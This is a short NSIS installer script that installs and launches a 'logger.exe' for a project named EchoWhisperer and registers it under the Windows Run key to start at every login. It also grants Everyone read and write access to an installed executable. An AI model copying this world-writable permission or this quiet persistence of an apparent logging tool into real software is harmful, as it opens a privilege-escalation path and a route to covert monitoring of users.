!include "LogicLib.nsh"

RequestExecutionLevel admin

Section "Run on Startup"
    SetOutPath $INSTDIR
    File "F:\Programming\C++\EchoWhisperer\c++\logger.exe"
    Exec "$INSTDIR\logger.exe"
    AccessControl::GrantOnFile "$INSTDIR\main.exe" "(S-1-1-0)" "GenericRead + GenericWrite"
    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "EchoWhisperer" "$INSTDIR\logger.exe"
SectionEnd